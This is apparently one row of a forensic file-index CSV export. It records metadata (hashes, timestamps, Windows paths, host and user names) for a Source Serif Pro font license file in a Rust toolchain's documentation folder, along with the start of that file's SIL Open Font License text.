+"5F978BA8E5C1D63D1E61AD17927F0237","140015124E12","SourceSerifPro-LICENSE.txt","4522","Archive (32)","25/03/2018 15:49:41.0000000","11/04/2018 16:13:06.1179615","11/04/2018 16:13:06.1179615","file:C:/Users/maxpowers/.rustup/toolchains/stable-x86_64-pc-windows-msvc/share/doc/rust/html/SourceSerifPro-LICENSE.txt","html","DESKTOP-EDSLQM8","text/plain","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000","25/03/2018 15:49:41.0000000",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","25/03/2018 15:49:41.0000000","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html","html (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust)","SourceSerifPro-LICENSE.txt","SourceSerifPro-LICENSE.txt","SourceSerifPro-LICENSE","C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html\SourceSerifPro-LICENSE.txt","SourceSerifPro-LICENSE (C:\Users\maxpowers\.rustup\toolchains\stable-x86_64-pc-windows-msvc\share\doc\rust\html)",".txt","document","Document","text/plain","False","SourceSerifPro-LICENSE.txt","1077936503","0","Copyright 2014 Adobe Systems Incorporated (http://www.adobe.com/), with Reserved Font Name 'Source'. All Rights Reserved. Source is a trademark of Adobe Systems Incorporated in the United States and/or other countries.
+
+This Font Software is licensed under the SIL Open Font License, Version 1.1.
+
+This license is copied below, and is also available with a FAQ at: http://scripts.sil.org/OFL
+
+
+-----------------------------------------------------------
+SIL OPEN FONT LICENSE Version 1.1 - 26 February 2007
+-----------------------------------------------------------
+
+PREAMBLE
+The goals of the Open Font License (OFL) are to stimulate worldwide
+development of collaborative font projects, to support the font creation
+efforts of academic and linguistic communities, and to provide a free and
+open framework in which fonts may be shared and improved in partnership
+with others.
+
+The OFL allows the licensed fonts to be used, studied, modified and
+redistributed freely as long as they are not sold by themselves. The
+fonts, in","11/04/2018 16:15:22.1023721","0,015625","file","CDB2FD2263555493","804cb650-0000-0000-0000-501f00000000","Text Document","12577"
